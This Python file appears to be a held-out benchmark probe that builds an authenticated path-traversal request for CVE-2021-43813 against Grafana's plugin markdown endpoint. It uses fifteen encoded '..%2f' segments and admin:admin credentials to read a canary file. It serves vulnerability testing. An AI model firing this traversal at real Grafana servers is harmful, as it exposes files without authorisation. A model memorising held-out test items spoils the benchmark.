#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-43813 residual exploit — authenticated Grafana plugin
markdown-endpoint path traversal.

The CVE-2021-43798 fix (patch.diff) only hardened the `/public/plugins/:pluginId/*`
static-asset handler (getPluginAssets). It did NOT touch the sibling markdown
endpoint `/api/plugins/:pluginId/markdown/:name` (GetPluginMarkdown), which builds
its path as filepath.Join(plugin.PluginDir, ToUpper(name)+".md") / ToLower(name)+".md"
with NO containment check on `name`. So the same class of `../` traversal still
escapes the plugin dir on V1 — exactly what CVE-2021-43813 reports. Differences vs
the seed: (1) a different sink/endpoint the patch missed, (2) requires any
authenticated user (basic auth admin:admin here), (3) the read is limited to files
whose name is fully upper- or lower-case and the ".md" extension is appended.

Contract: reaches the canary (flag) on V1 (grafana 8.3.1, HTTP 200) => the case is
a legitimate incomplete-patch positive. Closed on V2 (grafana 8.3.2), where the
markdown path is also clamped (returns the plugin's own README, never the canary).

The canary lives at /tmp/pcb_canary.md (lowercase basename `pcb_canary` matches the
ToLower fallback); the requested `name` omits the ".md" the handler appends.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# URL-encoded dot-dot (`..%2f`) segments so the router keeps them; the handler's
# filepath.Join collapses them. 15 levels to /, then tmp/pcb_canary (+".md" appended).
ETRAV = "".join(["..%2f"] * 15)
PATH = f"/api/plugins/alertlist/markdown/{ETRAV}tmp%2fpcb_canary"


def candidate() -> dict:
    return {
        "probe_id": "cve-2021-43813-markdown-traversal",
        "method": "GET",
        "path": PATH,
        "auth": "admin:admin",
    }


if __name__ == "__main__":
    print(candidate()["path"])
